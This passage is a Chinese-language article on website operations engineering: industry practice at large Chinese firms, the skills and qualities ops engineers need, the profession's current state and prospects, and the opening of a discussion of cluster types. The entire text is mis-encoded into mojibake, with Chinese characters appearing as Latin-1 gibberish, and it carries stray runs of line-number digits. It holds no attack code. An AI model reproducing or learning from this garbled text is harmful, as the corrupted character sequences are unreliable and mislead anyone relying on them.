¸ä¼˜åŒ–å®šåˆ¶ï¼Œå¦‚sinaå°±åœ¨memcacheä¸Šè¿›è¡Œè¿‡äºŒæ¬¡å¼€å‘ï¼Œæå‡ºäº†ä¸€ä¸ªMemcacheDBï¼Œå…·ä½“åšå¾—å¦‚ä½•æˆ‘ä»¬ä¸è°ˆï¼Œä½†å¼€æºäº†ï¼Œæ˜¯å€¼å¾—ç§°èµçš„ï¼Œå›½å†…å…¬å¸å¯¹äºå¼€æºåŸºæœ¬ä¸Šæ˜¯ç´¢å–ï¼Œæ²¡æœ‰è´¡çŒ®ï¼›å¦å¤–ï¼ŒæœåŠ¡å™¨ä¹Ÿä¸æ˜¯å¤§å®¶æ‰€ç†ŸçŸ¥çš„å‹å·ï¼Œæ ¹æ®ä¸šåŠ¡ç‰¹ç‚¹ï¼Œå¤§éƒ¨ä»½éƒ½æ˜¯æ‰¾DELL/HP/ibmè¿›è¡Œè¿‡å®šåˆ¶ï¼›å¦å¤–ï¼Œåœ¨åˆ†å¸ƒå¼å‚¨å­˜æ–¹é¢éƒ½æœ‰è‡ªå·²è§£å†³æ–¹æ¡ˆï¼Œè¦ä¸å°±æ˜¯ä½¿ç”¨ç°æˆå¼€æºhadoopç­‰è§£å†³æ–¹æ¡ˆï¼Œæˆ–è‡ªå·²å¼€å‘ã€‚ä½†90%éƒ½æ˜¯å€Ÿé‰´google GFSçš„æ€æƒ³:åˆ†å¸ƒå¼å­˜å‚¨ã€è®¡ç®—ã€å¤§è¡¨ã€‚ bã€å„å…¬å¸ä¸šåŠ¡æ–¹å‘ä¸ä¸€æ ·ï¼Œä¼šå¯¼è‡´è¿ç»´æ¨¡å¼æˆ–æ–¹æ³•éƒ½ä¸ä¸€æ ·ï¼Œå¦‚51.comå’Œbaiduè¿ç»´è‚¯å®šåŒºåˆ«å¾ˆå¤§ï¼Œå› ä¸ºä»–ä»¬ä¸šåŠ¡æ¨¡å¼å†³å®šäº†å…¶æ¶æ„ã€æœåŠ¡å™¨é‡çº§ã€IDCåˆ†å¸ƒã€ç½‘ç»œç»“æ„ã€é€šç”¨æŠ€æœ¯éƒ½ä¼šä¸ä¸€æ ·ï¼Œä¸»æ‰“æ–°é—»é—¨æˆ·çš„sinaä¸ä¸»æ‰“snsçš„51.comè¿ç»´æ¨¡å¼å·®å¼‚å°±éå¸¸å¤§,ç”šè‡³èŒè´£éƒ½ä¸å¤§ä¸€æ ·ï¼›ä½†æœ‰ä¸€ç‚¹ï¼Œé€šç”¨æŠ€æœ¯åŠå¤§è‡´æ¶æ„ä¸Šéƒ½å¤§åŒå°å¼‚ï¼Œå¤§å®¶ä¸è¦å¤ªç¥åŒ–ï¼Œæ›´å¤šçš„å…¬å¸åªæ˜¯ç©å’ç§¯æœ¨çš„æ¸¸æˆç½¢äº†ï¼Œæ²¡ä»€ä¹ˆæŠ€æœ¯å«é‡ã€‚ cã€å¦‚ä¸Šé¢æ‰€è®²ï¼Œç›®å‰å¤§å‹ç½‘ç«™è¿ç»´è¿˜å¤„äºå¹¼å¹´æ—¶æœŸç†å¿µå’Œç»éªŒéƒ½æ¯”è¾ƒé›¶æ•£ï¼Œæ²¡æœ‰æˆç†Ÿçš„çŸ¥è¯†ä½“ç³»ï¼Œå¯èƒ½å…·ä½“ä»€ä¹ˆæ˜¯è¿ç»´ï¼Œå¤§å®¶éƒ½è¦å…ˆæ€ç´¢ä¸€ç•ªï¼Œæˆ–å‹æ ¹æ²¡æƒ³è¿‡ï¼ŒçœŸæ­£è®¨è®ºä¹Ÿåªæ˜¯è¿ç»´å·¥ä½œçš„å†°å±±ä¸€è§’ï¼Œå±€é™äºå…·ä½“æŠ€æœ¯ç»†èŠ‚ï¼Œæˆ–æŸæŸè‘—åç½‘ç«™å¤§çš„æ¡†æ¶ï¼ŒçœŸæ­£è¿ç»´ä½“åŒ–ä¸œè¥¿æ²¡æœ‰ï¼Œè¿™ä¹Ÿè®¸æ˜¯ç›®å‰ç½‘ä¸Šè¿ç»´ç›¸å…³èµ„æ–™æ¯”è¾ƒå°‘çš„åŸæ•…å§ã€‚æˆ–è€…ä¹Ÿæ˜¯å›½å†…è¿ç»´äººå‘˜æ¯”è¾ƒéš¾æ‹›ï¼Œæ¯”è¾ƒç‰›çš„è¿ç»´å·¥ç¨‹å¸ˆæ¯”è¾ƒå°‘è§çš„åŸå› ä¹‹ä¸€å§ã€‚ äºŒã€è¿ç»´å·¥ä½œå¸ˆéœ€è¦ä»€ä¹ˆæ ·çš„æŠ€èƒ½åŠç´ è´¨åšä¸ºä¸€åè¿ç»´å·¥ç¨‹å¸ˆéœ€è¦ä»€ä¹ˆæ ·çš„æŠ€èƒ½åŠç´ è´¨å‘¢ï¼Œé¦–å…ˆè¯´è¯´æŠ€èƒ½å§ï¼Œå¦‚å¤§å®¶ä¸Šé¢æ‰€çœ‹åˆ°ï¼Œè¿ç»´æ˜¯ä¸€ä¸ªé›†å¤šITå·¥ç§æŠ€èƒ½ä¸ä¸€èº«çš„å²—ä½ï¼Œå¯¹ç³»ç»Ÿ-&gt;ç½‘ç»œ-&gt;å­˜å‚¨-&gt;åè®®-&gt;éœ€æ±‚-&gt;å¼€å‘-&gt;æµ‹è¯•-&gt;å®‰å…¨ç­‰å„ç¯èŠ‚éƒ½éœ€è¦äº†è§£ä¸€äº›ï¼Œä½†å¯¹äºæŸäº›ç¯èŠ‚éœ€ç†Ÿæ‚‰ç”šè‡³ç²¾é€šï¼Œå¦‚ç³»ç»Ÿ(åŸºæœ¬æ“ä½œç³»ç»Ÿçš„ç†Ÿæ‚‰ä½¿ç”¨,*nix,windows..)ã€åè®®ã€ç³»ç»Ÿå¼€å‘(æ—¥å¸¸å¾ˆé‡è¦çš„å·¥ä½œæ˜¯è‡ªåŠ¨è¿ç»´åŒ–ç›¸å…³å¼€å‘ã€å¤§è§„æ¨¡é›†ç¾¤å·¥å…·å¼€å‘ã€ç®¡ç†ï¼‰ã€é€šç”¨åº”ç”¨ï¼ˆå¦‚lvsã€haã€web serverã€dbã€ä¸­é—´ä»¶ã€å­˜å‚¨ç­‰ï¼‰ã€ç½‘ç»œ,IDCæ‹“æœ´æ¶æ„ï¼› æŠ€èƒ½æ–¹é¢æ€»ç»“ä»¥ä¸‹å‡ ç‚¹ï¼š1234561ã€å¼€å‘èƒ½åŠ›ï¼Œè¿™ç‚¹éå¸¸é‡è¦ï¼Œå› ä¸ºè¿ç»´å·¥å…·éƒ½éœ€è¦è‡ªå·²å¼€å‘ï¼Œå¼€å‘è¯­è¨€ï¼šperlã€pythonã€phpï¼ˆå…¶ä¸­ä¹‹ä¸€ï¼‰ã€shellï¼ˆawk,sed,expectâ€¦.ç­‰ï¼‰ï¼Œéœ€è¦æœ‰è¿‡å®é™…é¡¹ç›®å¼€å‘ç»éªŒï¼Œå¦åˆ™å·¥ä½œä¼šéå¸¸ç—›è‹¦ã€‚2ã€é€šç”¨åº”ç”¨æ–¹é¢éœ€è¦äº†è§£ï¼šæ“ä½œç³»ç»Ÿï¼ˆç›®å‰å›½å†…ä¸»è¦æ˜¯linuxã€bsdï¼‰ã€webserverç›¸å…³(nginx,apahe,php,lighttpd,javaã€‚ã€‚ã€‚)ã€æ•°æ®åº“(mysql,oralce)ã€å…¶å®ƒæ‚ä¸ƒå…«æ‹‰çš„ä¸œä¸œï¼›ç³»ç»Ÿä¼˜åŒ–ï¼Œé«˜å¯é æ€§ï¼›è¿™äº›åªæ˜¯åŠ åˆ†é¡¹ï¼Œä¸éœ€å¿…å¤‡ï¼Œå¯ä»¥è¾¹å·¥ä½œè¾¹æ…¢æ…¢å­¦ï¼Œè¿™äº›ä¸œè¥¿éƒ½ä¸éš¾ã€‚å½“ç„¶åœ¨è¿ç»´ä¸­ï¼Œæœ‰äº›æ˜¯æœ‰åˆ†å·¥åé‡ç‚¹ä¸ä¸€æ ·ã€‚3ã€ç³»ç»Ÿã€ç½‘ç»œã€å®‰å…¨ï¼Œå­˜å‚¨ï¼ŒCDNï¼ŒDBç­‰éœ€è¦ç›¸å½“äº†è§£ï¼ŒçŸ¥é“å…¶ç›¸å…³åŸç†ã€‚ ä¸ªäººç´ è´¨æ–¹é¢ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778791ã€æ²Ÿé€šèƒ½åŠ›ã€å›¢é˜Ÿåä½œï¼šè¿ç»´å·¥ä½œè·¨éƒ¨é—¨ã€è·¨å·¥ç§å·¥ä½œå¾ˆå¤šï¼Œéœ€å–„äºæ²Ÿé€šã€å¹¶ä¸”å›¢é˜Ÿåä½œèƒ½åŠ›è¦å¼ºï¼›è¿™åº”è¯¥æ˜¯ç°ä»£ä¼ä¸šçš„åŸºæœ¬ç´ è´¨è¦æ±‚äº†ï¼Œä¸å¤šè¯´ã€‚2ã€å·¥ä½œä¸­éœ€èƒ†å¤§å¿ƒç»†ï¼šèƒ†å¤§æ‰èƒ½åˆ›æ–°ã€ä¸èµ°å¯»å¸¸è·¯ï¼Œç‰¹åˆ«å¯¹äºè¿ç»´è¿™ç§æ–°çš„å·¥ç§ï¼Œæ›´éœ€åˆ›æ–°æ‰èƒ½ä¿ƒè¿›å‘å±•ï¼›å¿ƒç»†ï¼Œè¿ç»´å·¥ç¨‹å¸ˆæ˜¯ç½‘ç«™admin,æœ€é«˜çº¿ä¸Šæƒé™è€…ï¼Œä¸€ä¸å°å¿ƒå°±ä¼šé—æ†¾ç»ˆç”Ÿæˆ–æ‰“å…¥åå…«å±‚åœ°ç‹±ã€‚3ã€ä¸»åŠ¨æ€§ã€æ‰§è¡ŒåŠ›ã€ç²¾åŠ›æ—ºç››ã€æŠ—å‹èƒ½åŠ›å¼ºï¼šç”±äºITè¡Œä¸šçš„ç‰¹æ€§ï¼Œå˜åŒ–å¿«ï¼›å¾€å¾€è®¡åˆ’èµ¶ä¸ä¸Šå˜åŒ–ï¼Œè¿ç»´å·¥ä½œå°±æ›´çªå‡ºäº†ï¼Œæ¯”å¦‚å›½å†…å„å¤§å…¬å¸æœåŠ¡å™¨å¾€å¾€æ˜¯å…¨å›½å„åœ°ï¼Œå“ªé‡Œä¾¿å®œæ€§ä»·æ¯”é«˜ï¼Œå°±é‚£å¾€æ¬ï¼Œè¿›è¡Œå¤§è§„æ¨¡æœåŠ¡è¿ç§»ï¼ˆç‰µæ‰¯çš„æœåŠ¡å™¨æˆç™¾ä¸Šåƒå°ï¼‰ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸å¤´ç—›çš„é—®é¢˜ï¼›å¾€å¾€æ—¶é—´éå¸¸ç´§è¿«ï¼Œå¦‚é™1å‘¨å†…å®Œæˆï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œè¿ç»´å·¥ç¨‹å¸ˆçš„ä¸»åŠ¨æ€§åŠæ‰§è¡ŒåŠ›å°±æœ‰å¾ˆé«˜çš„è¦æ±‚äº†ï¼šè®¡åˆ’ã€æ–¹æ¡ˆã€æœåŠ¡æ— ç¼è¿ç§»ã€æœºå™¨æ¬è¿ä¸Šæ¶ã€ç¯å¢ƒå‡†å¤‡ã€å®‰å…¨è¯„ä¼°ã€æ€§èƒ½è¯„ä¼°ã€åŸºå»ºã€å„å…³è”éƒ¨é—¨æ‰¯çš®,7X24å°ç´§æ€¥äº‹æ•…å“åº”ç­‰ã€‚4ã€å…¶å®ƒå°±æ˜¯ä¸€äº›åŸºæœ¬ç´ è´¨äº†ï¼šå¤´è„‘è¦çµå…‰ã€é€»è¾‘æ€ç»´èƒ½åŠ›å¼ºã€ä¸ºäººè°¦è™šç¨³é‡ã€äº²å’ŒåŠ›ã€ä¹äºåŠ©äººã€æœ‰å¤§å±€è§‚ã€‚5ã€æœ€åä¸€ç‚¹ï¼Œåšç½‘ç«™è¿ç»´éœ€è¦æœ‰æ¢ç´¢åˆ›æ–°ç²¾ç¥ï¼Œé€šè¿‡åˆ›æ–°å‹æ€ç»´è§£å†³ç°å®ä¸­çš„é—®é¢˜ï¼Œå› ä¸ºè¿™æ˜¯ä¸€ä¸ªå¤„äºå¹¼å¹´çš„èŒä¸šï¼ˆå›½å¤–ä¹Ÿä¸€æ ·ï¼Œä½†æ¯”å›½å†…èµ·æ­¥æ—©ç‚¹ï¼‰ï¼Œæ²¡æœ‰æˆç†Ÿä½“ç³»æˆ–æ–¹æ³•è®ºå¯ä»¥å€Ÿé‰´ï¼Œåªèƒ½é å¤§å®¶è‡ªå·²æ‘¸ç´¢åŠªåŠ›ã€‚ä¸‰ã€æ€æ ·æ‰ç®—æ˜¯ä¸€ä¸ªåˆæ ¼çš„è¿ç»´å·¥ç¨‹å¸ˆ1ã€ä¿è¯æœåŠ¡è¾¾åˆ°è¦æ±‚çš„çº¿ä¸Šæ ‡å‡†ï¼Œå¦‚99.9%ï¼›ä¿è¯çº¿ä¸Šç¨³å®šï¼Œè¿™æ˜¯è¿ç»´å·¥ç¨‹å¸ˆçš„åŸºæœ¬è´£èŒæ‰€åœ¨ã€‚2ã€ä¸æ–­çš„æå‡åº”ç”¨çš„å¯é æ€§ä¸å¥å£®æ€§ã€æ€§èƒ½ä¼˜åŒ–ã€å®‰å…¨æå‡ï¼›è¿™æ–¹é¢éå¸¸è€ƒéªŒä¸»åŠ¨æ€§å’Œåˆ›æ–°æ€ç»´ã€‚3ã€ç½‘ç«™å„å±‚é¢ç›‘æ§ã€ç»Ÿè®¡çš„è¦†ç›–åº¦ï¼Œè½¯ä»¶ã€ç¡¬ä»¶ã€è¿è¡ŒçŠ¶æ€ï¼Œèƒ½ç›‘æ§çš„éƒ½éœ€è¦ç›‘æ§ç»Ÿè®¡ï¼Œé¿å…ç›‘æ§æ­»è§’ã€å¹¶èƒ½å®æ—¶äº†è§£åº”ç”¨çš„è¿è½¬æƒ…å†µã€‚4ã€é€šè¿‡åˆ›æ–°æ€ç»´è§£å†³è¿ç»´æ•ˆç‡é—®é¢˜ï¼›ç›®å‰å„å…¬å¸å¤§éƒ¨ä»½è¿ç»´ä¸»è¦å·¥ä½œè¿˜æ˜¯ä¾èµ–äººå·¥æ“ä½œå¹²é¢„ï¼Œéœ€è¦å°½å¯èƒ½çš„è§£æ”¾åŒæ‰‹ã€‚5ã€è¿ç»´çŸ¥è¯†çš„ç§¯ç´¯ä¸æ²‰æ·€ã€æ–‡æ¡£çš„å®Œå¤‡æ€§ï¼Œè¿ç»´æ˜¯ä¸€ä¸ªç»éªŒæ€§éå¸¸å¼ºçš„å²—ä½ï¼Œå¥½çš„ç»éªŒä¸é™·é˜±éƒ½éœ€ç§¯ç´¯ä¸‹æ¥ï¼Œé¿å…é‡å¤æ€§èŒƒé”™ã€‚6ã€è®¡åˆ’æ€§å’Œæ‰§è¡ŒåŠ›ï¼›å·¥ä½œæœ‰è®¡åˆ’ï¼Œè®¡åˆ’åæƒ³æ³•è®¾æ³•è¾¾åˆ°ç›®æ ‡ï¼Œä¸æ‰¾å€Ÿå£ã€‚7ã€è‡ªåŠ¨åŒ–è¿ç»´ï¼›èƒ½å¯¹æ—¥å¸¸æœºæ¢°åŒ–å·¥ä½œè¿›è¡Œæç‚¼ã€è®¾è®¡å¹¶å¼€å‘æˆå·¥å…·ã€ç³»ç»Ÿï¼Œèƒ½è®©ç³»ç»Ÿè‡ªåŠ¨å®Œæˆçš„å°½é‡ä¾é ç³»ç»Ÿï¼›è®©å¤§å®¶æ›´å¤šçš„æ—¶é—´ç”¨äºæ€è€ƒã€åˆ›æ–°æ€ç»´ã€åšè‡ªå·²å–œæ¬¢çš„äº‹æƒ…ã€‚ä»¥ä¸Šåªæ˜¯æŠ€æœ¯ä¸Šçš„ä¸€äº›å±‚é¢ï¼Œå½“ç„¶ä¸ªäººæ„è¯†ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ã€‚å››ã€è¿ç»´èŒä¸šçš„è¿·æƒ˜ã€ç°çŠ¶ä¸å‘å±•å‰æ™¯è¿ç»´å²—ä½ä¸åƒå…¶å®ƒå²—ä½ï¼Œå¦‚ç ”å‘å·¥ç¨‹å¸ˆã€æµ‹è¯•å·¥ç¨‹å¸ˆç­‰ï¼Œæœ‰éå¸¸æ˜ç¡®çš„èŒè´£å®šä½åŠèŒä¸šè§„åˆ’ï¼Œæ¯”è¾ƒæœ‰èŒä¸šè®¤åŒæ„Ÿä¸æˆå°±æ„Ÿï¼›è€Œè¿ç»´å·¥ä½œå¯èƒ½ç»™äººçš„æ„Ÿè§‰æ˜¯å“ªæ–¹é¢éƒ½äº†è§£ä¸€äº›ï¼Œä½†åˆéƒ½æ¯”ä¸Šä¸“èŒå·¥ç¨‹å¸ˆæ›´ç²¾é€šã€æ„Ÿè§‰å¹³æ—¶è¢«å…³æ³¨åº¦æ¯”è¾ƒä½ï¼ˆé™¤éçº¿ä¸Šå‡ºç°æ•…éšœï¼‰ï¼Œæ…¢æ…¢çš„å¤§å®¶å°±ä¼šè¿·æƒ˜ï¼Œå¯¹èŒä¸šå‘å±•äº§ç”Ÿå›°æƒ‘,ä¸ºä»€ä¹ˆä¼šæœ‰è¿™ç§ç°è±¡å‘¢ï¼Ÿé™¤äº†èŒä¸šæœ¬èº«ç‰¹ç‚¹å¤–ï¼Œä¸»è¦è¿˜æ˜¯å› ä¸ºå¯¹è¿ç»´äº†è§£ä¸æ·±å…¥ã€åšå¾—ä¸æ·±å…¥å¯¼è‡´ï¼›å…¶å®è¿™ä¸ªé—®é¢˜å…¶å®ƒå²—ä½ä¹Ÿä¼šå‡ºç°ï¼Œä½†æˆ‘å‘ç°è¿ç»´æ›´å…¸å‹ï¼Œæ›´å®¹æ˜“å‡ºç°è¿™ä¸ªé—®é¢˜ï¼›é’ˆå¯¹è¿™ä¸ªé—®é¢˜æˆ‘è°ˆä¸€ä¸‹ç½‘ç«™è¿ç»´çš„ç°çŠ¶åŠå‘å±•å‰æ™¯ï¼ˆä¹Ÿåœ¨æ€è€ƒä¸­ï¼Œå¯èƒ½ä¸å¤ªæ·±å…¥å…¨é¢ï¼Œä¹Ÿè¯·å¤§å®¶æ–§æ­£è¡¥å……ï¼‰è¿ç»´ç°çŠ¶ï¼š1ã€å¤„äºåˆšèµ·æ­¥çš„åˆçº§é˜¶æ®µï¼Œå„å¤§å…¬å¸æœ‰æ­¤ä¸“èŒï¼Œä½†é‡è§†æˆ–é‡è¦ç¨‹åº¦ä¸é«˜ï¼Œå¯æ›¿ä»£æ€§å¼ºï¼›å°å…¬å¸æ›´å¤šæ˜¯ç”±å…¶å®ƒå²—ä½æ¥å…¼é¡¾åšè¿™ä¸€å—å·¥ä½œï¼Œæ²¡æœ‰ä¸“èŒï¼Œä¹Ÿä¸å¯èƒ½åšå¾—æ·±å…¥ã€‚2ã€æŠ€æœ¯å±‚æ¬¡æ¯”è¾ƒä½ï¼›ä¸»è¦å¤„äºæŠ€æœ¯æ¢ç´¢ã€ç§¯ç´¯é˜¶æ®µï¼Œæ²¡æœ‰å‹æˆä½“ç³»åŒ–çš„ç†å¿µã€æŠ€æœ¯ã€‚3ã€ä½“åŠ›åŠ³åŠ¨åå¤§ï¼›è¿™ä¸ªé—®é¢˜ä¸»è¦ä¸ç¬¬äºŒç‚¹æœ‰å…³ç³»ï¼Œå¾ˆå¤šäº‹æƒ…è¿˜æ˜¯ä¾é äººåŠ›è¿›è¡Œï¼Œæ²¡æœ‰å®Œæˆå¥½çš„æç»ƒï¼Œå¯¹äºå¤§è§„æ¨¡é›†ç¾¤æ²¡æœ‰æˆç†Ÿçš„è‡ªåŠ¨åŒ–ç®¡ç†æ–¹æ³•ï¼Œåœ¨æ­¤è¯´æ˜ä¸€ä¸‹ï¼Œå¤§è§„æ¨¡é›†ç¾¤ä¸è¿ç»´å·¥ä½œæ˜¯æ¯æ¯ç›¸å…³çš„å¦‚æœåªæ˜¯ç™¾åæ¥å°æœºå™¨ï¼Œé‚£å°±æ²¡æœ‰è¿ç»´å¤ªå¤§çš„ç”Ÿå­˜ç©ºé—´äº†ã€‚4ã€ä¼˜ç§€è¿ç»´äººæ‰çš„æåº¦ç¼ºä¹ï¼›ç›®å‰å„å¤§å…¬å¸åŸºæœ¬ä¸Šéƒ½é è‡ªå·²åŸ¹å…»ï¼Œè¿™ä¸ªç°çŠ¶å¯¼è‡´è¡Œä¸šå†…è¿ç»´äººæ‰çš„æµåŠ¨æ€§éå¸¸ä½ï¼Œéå¸¸å¤šå¥½çš„æŠ€æœ¯éƒ½å±€é™åœ¨å„å¤§å…¬å¸å†…éƒ¨ï¼Œå¦‚ google 50ä¸‡å°æœºå™¨ç§‘å­¦çš„ç®¡ç†,æˆ–è€…å›½å†…äº’è”å…¬å¸top 10çš„ä¸€äº›è¿ç»´ç»éªŒï¼Œè¿™äº›ç»éªŒæ˜¯éå¸¸æœ‰ä»·å€¼çš„ä¸œè¥¿å¹¶å†³å®šäº†ä¸€ä¸ªå…¬å¸çš„æ ¸å¿ƒç«äº‰åŠ›ï¼›è¿™äº›é—®é¢˜è¿›è€Œå¯¼è‡´ä¸šå†…å…ˆè¿›è¿ç»´æŠ€æœ¯çš„æµé€šã€è´¯é€šã€ä¸å€Ÿç­¾ï¼Œå¹¶æœ€ç»ˆå°†é™åˆ¶äº†è¿ç»´å‘å±•ã€‚5ã€å¾ˆå¤šä¼˜ç§€çš„è¿ç»´ç»éªŒéƒ½æŒæ¡åœ¨å¤§å…¬å¸æ‰‹ä¸­ï¼›è¿™ä¸åœ¨äºå…¬å¸çš„æŠ€æœ¯å®åŠ›ï¼Œè€Œåœ¨äºå¤§å…¬å¸çš„æŠ€æœ¯è§„æ¨¡ã€æµ·é‡PVã€ç¡¬ä»¶è§„æ¨¡è¶³å¤Ÿå¤§ï¼Œå¦‚baiduå¯æ€•çš„æµé‡ã€ 51.comæµ·é‡æ•°æ®~~~~è¿™äº›å› ç´ å†³å®šäº†ä»–ä»¬é‡åˆ°çš„é—®é¢˜éƒ½æ˜¯å…¶å®ƒä¸­/å°å…¬å¸è¿˜æ²¡æœ‰é‡åˆ°çš„ï¼Œæˆ–å³å°†é‡åˆ°ã€‚ä½†å¤§å…¬å¸å¯èƒ½å·²æœ‰å¾ˆå¥½çš„è§£å†³æ–¹æ¡ˆæˆ–ç³»ç»Ÿã€‚å‘å±•å‰æ™¯ï¼š1ã€ä»è¡Œä¸šè§’åº¦æ¥çœ‹ï¼Œéšç€ä¸­å›½äº’è”ç½‘çš„é«˜é€Ÿå‘å±•ï¼ˆç›®å‰ä¸­å›½ç½‘æ°‘å·²è·ƒå‡ä¸ºå…¨çƒç¬¬ä¸€ï¼‰ã€ç½‘ç«™è§„æ¨¡è¶Šæ¥è¶Šæ¥å¤§ã€æ¶æ„è¶Šæ¥è¶Šå¤æ‚ï¼›å¯¹ä¸“èŒç½‘ç«™è¿ç»´å·¥ç¨‹å¸ˆã€ç½‘ç«™æ¶æ„å¸ˆçš„è¦æ±‚ä¼šè¶Šæ¥è¶Šæ€¥è¿«,ç‰¹åˆ«æ˜¯å¯¹æœ‰ç»éªŒçš„ä¼˜ç§€è¿ç»´äººæ‰éœ€æ±‚é‡å¤§ï¼Œè€Œä¸”æ˜¯è¶Šè€è¶Šå€¼é’±ï¼›ç›®å‰å›½å†…åŸºæœ¬ä¸Šéƒ½æ˜¯é€‰æ‹©æ¯•ä¸šç”ŸåŸ¹å…»ï¼ˆé™äºå¤§å…¬å¸ï¼‰ï¼ŒåŸ¹å…»æˆæœ¬é«˜ï¼Œè€Œä¸”æ²¡æœ‰ç»éªŒäººæ‰åŠ å…¥ä¼šå¯¼è‡´å…¬å¸æŠ€æœ¯æ›´æ–°ç¼“æ…¢ã€å½±å“å…¬å¸çš„æŠ€æœ¯å‘å±•ï¼›å½“ç„¶ï¼Œæ¯•ä¸šç”Ÿä¹Ÿæœ‰å¥½å¤„ï¼šç™½çº¸ä¸€å¼ ï¼Œå¯å¡‘æ€§å¼ºï¼Œæ¯”è¾ƒè®¤åŒå¹¶å®¹æ˜“èå…¥ä¼ä¸šæ–‡åŒ–ã€‚2ã€ä»ä¸ªäººè§’åº¦ï¼Œè¿ç»´å·¥ç¨‹å¸ˆæŠ€æœ¯å«é‡åŠè¦æ±‚ä¼šè¶Šæ¥è¶Šé«˜ï¼ŒåŒæ—¶ä¹Ÿæ˜¯å¯¹å…¬å¸åº”ç”¨ã€æ¶æ„æœ€äº†è§£æœ€ç†Ÿæ‚‰çš„äººã€è¶Šæ¥è¶Šå¾—åˆ°é‡è§†ã€‚3ã€ç½‘ç«™è¿ç»´å°†æˆä¸ºä¸€ä¸ªèåˆå¤šå­¦ç§‘ï¼ˆç½‘ç»œã€ç³»ç»Ÿã€å¼€å‘ã€å®‰å…¨ã€åº”ç”¨æ¶æ„ã€å­˜å‚¨ç­‰ï¼‰çš„ç»¼åˆæ€§æŠ€æœ¯å²—ä½ï¼Œç»™å¤§å®¶æä¾›ä¸€ä¸ªå¾ˆå¥½çš„ä¸ªäººèƒ½åŠ›ä¸æŠ€æœ¯å¹¿åº¦çš„å‘å±•ç©ºé—´ã€‚4ã€è¿ç»´å·¥ä½œçš„ç›¸å…³ç»éªŒå°†ä¼šå˜å¾—éå¸¸é‡è¦ï¼Œè€Œä¸”ä¹Ÿå°†æˆä¸ºä¸ªäººçš„æ ¸å¿ƒç«äº‰åŠ›ï¼Œå…·å¤‡å¾ˆå¥½çš„å„å±‚é¢é—®é¢˜çš„è§£å†³èƒ½åŠ›åŠæ–¹æ¡ˆæä¾›ã€å…¨å±€æ€è€ƒèƒ½åŠ›ç­‰ã€‚5ã€ç‰¹é•¿å‘æŒ¥å’Œå…´è¶£çš„åŸ¹å…»ï¼›ç”±äºè¿ç»´å²—ä½æ‰€æ¥è§¦çš„çŸ¥è¯†é¢éå¸¸å¹¿é˜”ï¼Œæ›´å®¹æ˜“åŸ¹å…»æˆ–å‘æŒ¥å‡ºä¸ªäººæŸäº›æ–¹é¢çš„ç‰¹é•¿æˆ–çˆ±å¥½ï¼Œå¦‚å†…æ ¸ã€ç½‘ç»œã€å¼€å‘ã€æ•°æ®åº“ç­‰æ–¹é¢ï¼Œå¯ä»¥åšå¾—éå¸¸æ·±å…¥ç²¾é€šã€æˆä¸ºè¿™æ–¹é¢çš„ä¸“å®¶ã€‚6ã€å¦‚æœçœŸè¦ä»¥åä¸æƒ³åšè¿ç»´äº†ï¼Œè½¬åˆ°å…¶å®ƒå²—ä½ä¹Ÿæ¯”è¾ƒå®¹æ˜“ï¼Œä¸ä¼šæœ‰å¤ªå¤§çš„å±€é™æ€§ã€‚å½“ç„¶äº†ï¼Œä½ å¾—çœŸæ­£ç”¨å¿ƒå»åšã€‚7ã€æŠ€æœ¯å‘å±•æ–¹å‘ï¼šç½‘ç«™/ç³»ç»Ÿæ¶æ„å¸ˆã€‚äº”ã€è¿ç»´å…³é”®æŠ€æœ¯ç‚¹è§£å‰–1ã€ å¤§è§„æ¨¡é›†ç¾¤ç®¡ç†é—®é¢˜é¦–å…ˆæˆ‘ä»¬å…ˆè¦æ˜ç¡®é›†ç¾¤çš„æ¦‚å¿µï¼Œé›†ç¾¤ä¸æ˜¯æ³›æŒ‡å„åŠŸèƒ½æœåŠ¡å™¨çš„æ€»åˆï¼Œè€Œæ˜¯æŒ‡ä¸ºäº†è¾¾åˆ°æŸä¸€ç›®çš„æˆ–åŠŸèƒ½çš„æœåŠ¡å™¨ã€ç¡¬ç›˜èµ„æºçš„æ•´åˆï¼ˆæœºå™¨æ•°å¤§äºä¸¤å°ï¼‰ï¼Œå¯¹äºåº”ç”¨æ¥è¯´å®ƒå°±æ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œç›®å‰å¸¸è§„é›†ç¾¤å¯åˆ†ä¸ºï¼šé«˜å¯ç”¨æ€§é›†ç¾¤ï¼ˆHAï¼‰ï¼Œè´Ÿè½½å‡è¡¡é›†ç¾¤ï¼ˆå¦‚lvsï¼‰ï¼Œåˆ†å¸ƒå¼å‚¨ã€è®¡ç®—å­˜å‚¨é›†ç¾¤ï¼ˆDFSï¼Œå¦‚google gfs,yahoohadoopï¼‰ï¼Œç‰¹å®šåº”ç”¨é›†ç¾¤ï¼ˆæŸä¸€ç‰¹å®šåŠŸèƒ½æœåŠ¡å™¨ç»„åˆã€å¦‚dbã€cacheå±‚ç­‰ï¼‰ï¼Œç›®å‰äº’è”ç½‘è¡Œä¸šä¸»è¦åŸºäºè¿™å››ç§ç±»å‹ï¼›å¯¹äºå‰ä¸¤ç§ç±»ä¼¼ï¼Œå¦‚æœä¸šåŠ¡ç®€å•ã€åº”ç”¨ä¸Špostæ“ä½œæ¯”è¾ƒå°‘ï¼Œå¯ä»¥ç®€å•çš„é‡‡ç”¨å››å±‚äº¤æ¢æœºè§£å†³ï¼ˆå¦‚f5ï¼‰ï¼Œè¾¾åˆ°æœåŠ¡é«˜å¯ç”¨/è´Ÿè´£å‡è¡¡çš„ä½œç”¨ï¼Œå¯¹äºèµ„æºç´§å¼ 